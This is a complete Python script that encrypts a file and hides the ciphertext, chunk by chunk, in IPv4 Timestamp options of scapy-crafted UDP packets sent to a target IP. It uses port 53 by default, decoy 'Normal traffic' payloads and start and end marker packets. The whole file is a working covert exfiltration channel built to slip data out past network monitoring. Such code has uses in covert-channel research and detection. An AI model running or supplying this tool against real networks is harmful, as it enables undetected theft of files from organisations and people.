import sys
import os
import subprocess
import argparse
from scapy.all import *

def read_key_file(key_file):
    """Read encryption key from a file"""
    try:
        with open(key_file, 'r') as f:
            key = f.read().strip()
        print(f"[KEY] Reading key from {key_file}")
        print(f"[KEY] Key length: {len(key)} characters")
        return key
    except FileNotFoundError:
        print(f"[ERROR] Key file '{key_file}' not found")
        sys.exit(1)
    except Exception as e:
        print(f"[ERROR] Error reading key file: {str(e)}")
        sys.exit(1)

def encrypt_file(input_file, encrypted_file, key):
    """Encrypt the input file using the AES encryption binary"""
    try:
        aes_binary = "./aes_encrypt"  # Adjust path as needed
        
        if not os.path.exists(aes_binary):
            print(f"[ERROR] AES encryption binary not found at {aes_binary}")
            sys.exit(1)
        
        print(f"[ENCRYPT] Encrypting {input_file}")
        print(f"[ENCRYPT] Input file size: {os.path.getsize(input_file)} bytes")
        
        result = subprocess.run(
            [aes_binary, "-e", input_file, encrypted_file, key],
            capture_output=True,
            text=True
        )
        
        print("[ENCRYPT] AES Binary STDOUT:")
        print(result.stdout)
        print("[ENCRYPT] AES Binary STDERR:")
        print(result.stderr)
        
        if result.returncode != 0:
            print(f"[ERROR] Encryption failed: {result.stderr}")
            sys.exit(1)
        
        print(f"[ENCRYPT] Successfully encrypted {input_file} to {encrypted_file}")
        print(f"[ENCRYPT] Encrypted file size: {os.path.getsize(encrypted_file)} bytes")
        return True
    except Exception as e:
        print(f"[ERROR] Error during encryption: {str(e)}")
        sys.exit(1)

def chunk_file_to_packets(input_file, chunk_size=30):
    """Reads an encrypted file and splits its contents into packet-sized chunks."""
    try:
        print(f"[CHUNK] Starting file chunking for {input_file}")
        print(f"[CHUNK] Chunk size: {chunk_size} bytes")
        
        with open(input_file, 'rb') as infile:
            chunks = []
            chunk_count = 0
            while True:
                chunk = infile.read(chunk_size)
                if not chunk:
                    break
                
                hex_chunk = ' '.join(f'{byte:02x}' for byte in chunk)
                chunks.append(hex_chunk)
                chunk_count += 1
                
                print(f"[CHUNK] Chunk {chunk_count}: {len(chunk)} bytes")
                print(f"[CHUNK] Hex representation: {hex_chunk}")
        
        print(f"[CHUNK] Total chunks created: {chunk_count}")
        return chunks
    except FileNotFoundError:
        print(f"[ERROR] Input file '{input_file}' not found")
        sys.exit(1)
    except Exception as e:
        print(f"[ERROR] Chunking error: {str(e)}")
        sys.exit(1)

def create_zero_packet():
    """Create a packet with all-zero data in IP options"""
    zero_data = '00 ' * 30  # 30 bytes of zeros in hex
    opt_type = 0x44  # Timestamp
    opt_pointer = 5
    opt_overflow_flags = 0
    opt_len = 4 + 30  # 4 bytes header + 30 bytes data
    
    option = bytes([opt_type, opt_len, opt_pointer, opt_overflow_flags]) + bytes.fromhex(zero_data.replace(' ', ''))
    padding_needed = (4 - (len(option) % 4)) % 4
    if padding_needed > 0:
        option += b'\x00' * padding_needed
    
    print(f"[ZERO] Created zero packet with {len(option)} bytes")
    return option

def encode_chunk_to_ip_options(chunk):
    """Encode a hex chunk into IP options format using the Timestamp option."""
    data_bytes = bytes.fromhex(chunk)
    opt_type = 0x44  # Timestamp
    opt_pointer = 5
    opt_overflow_flags = 0
    opt_len = 4 + len(data_bytes)
    
    option = bytes([opt_type, opt_len, opt_pointer, opt_overflow_flags]) + data_bytes
    padding_needed = (4 - (len(option) % 4)) % 4
    if padding_needed > 0:
        option += b'\x00' * padding_needed
    
    print(f"[OPTION] Encoded chunk: {len(data_bytes)} bytes")
    print(f"[OPTION] Option type: {hex(opt_type)}")
    print(f"[OPTION] Total option length: {opt_len}")
    
    return option

def send_encrypted_chunks(target_ip, port, chunks, cover_data="Normal traffic"):
    """Send encrypted chunks with initial and final zero packets."""
    if ":" in target_ip:
        print("[ERROR] IP Options are only available in IPv4, not IPv6")
        return
    
    try:
        print(f"[SEND] Network Interface Details:")
        # Get network interface details
        import subprocess
        interface_output = subprocess.check_output(["ip", "route"]).decode()
        print(interface_output)
        
        print(f"[SEND] Local IP Address:")
        local_ip_output = subprocess.check_output(["hostname", "-I"]).decode()
        print(local_ip_output)
        print(f"[SEND] Preparing to send to {target_ip}:{port}")
        total_packets = len(chunks) + 2  # Including initial and final zero packets
        print(f"[SEND] Total packets to send (including markers): {total_packets}")
        
        # Send initial zero packet
        print("\n[SEND] Sending initial marker packet")
        zero_option = create_zero_packet()
        initial_packet = IP(dst=target_ip, options=IPOption(zero_option))/UDP(dport=port)/Raw(load=f"{cover_data} Start Marker")
        send(initial_packet, verbose=0)  # verbose=0 to reduce extra output
        print("[SEND] Initial zero packet sent successfully")
        
        # Send actual data packets
        for i, chunk in enumerate(chunks, 1):
            print(f"\n[SEND] Preparing data packet {i}/{len(chunks)}")
            option_bytes = encode_chunk_to_ip_options(chunk)
            packet = IP(dst=target_ip, options=IPOption(option_bytes))/UDP(dport=port)/Raw(load=f"{cover_data} Packet {i}")
            
            print(f"[SEND] Packet {i} details:")
            print(f"  - Destination IP: {target_ip}")
            print(f"  - Destination Port: {port}")
            print(f"  - Option bytes length: {len(option_bytes)}")
            print(f"  - Payload: {cover_data} Packet {i}")
            
            send(packet, verbose=0)  # verbose=0 to reduce extra output
            print(f"[SEND] Data packet {i} sent successfully")
        
        # Send final zero packet
        print("\n[SEND] Sending final marker packet")
        final_packet = IP(dst=target_ip, options=IPOption(zero_option))/UDP(dport=port)/Raw(load=f"{cover_data} End Marker")
        send(final_packet, verbose=0)  # verbose=0 to reduce extra output
        print("[SEND] Final zero packet sent successfully")
        
        print(f"\n[SEND] Encrypted steganographic transmission complete.")
    except PermissionError:
        print("[ERROR] Permission denied: Run the script with sudo/admin privileges.")
        sys.exit(1)
    except Exception as e:
        print(f"[ERROR] Error sending packets: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description='Verbose Encrypted Steganographic Packet Sender with Marker Packets')
    parser.add_argument('--input-file', default='input.txt', help='Input file to send')
    parser.add_argument('--key-file', default='key.txt', help='Encryption key file')
    parser.add_argument('--target-ip', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, default=53, help='Destination port')
    parser.add_argument('--verbose', action='store_true', help='Enable extra verbose output')
    
    args = parser.parse_args()
    
    temp_dir = 'temp'
    os.makedirs(temp_dir, exist_ok=True)
    print(f"[INIT] Created temporary directory: {temp_dir}")
    
    encrypted_file = os.path.join(temp_dir, 'encrypted.bin')
    print(f"[INIT] Encrypted file will be: {encrypted_file}")
    
    key = read_key_file(args.key_file)
    encrypt_file(args.input_file, encrypted_file, key)
    chunks = chunk_file_to_packets(encrypted_file)
    send_encrypted_chunks(args.target_ip, args.port, chunks)

if __name__ == "__main__":
    main()